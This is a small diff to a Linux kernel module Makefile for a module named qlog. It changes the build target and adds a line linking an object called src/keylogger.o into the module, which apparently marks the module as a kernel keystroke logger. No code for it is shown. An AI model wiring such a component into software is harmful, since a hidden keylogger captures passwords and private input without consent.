@@ -1,8 +1,7 @@
-# Loadable module goals
-obj-m += src/qlog.o
+# Main module target
+obj-m += qlog.o
 
-# Non-loadable goal
-# obj-y += ...
+qlog-objs += src/qlog.o src/keylogger.o
 
 # Compiler flags
 EXTRA_CFLAGS := -I$(src)/inc
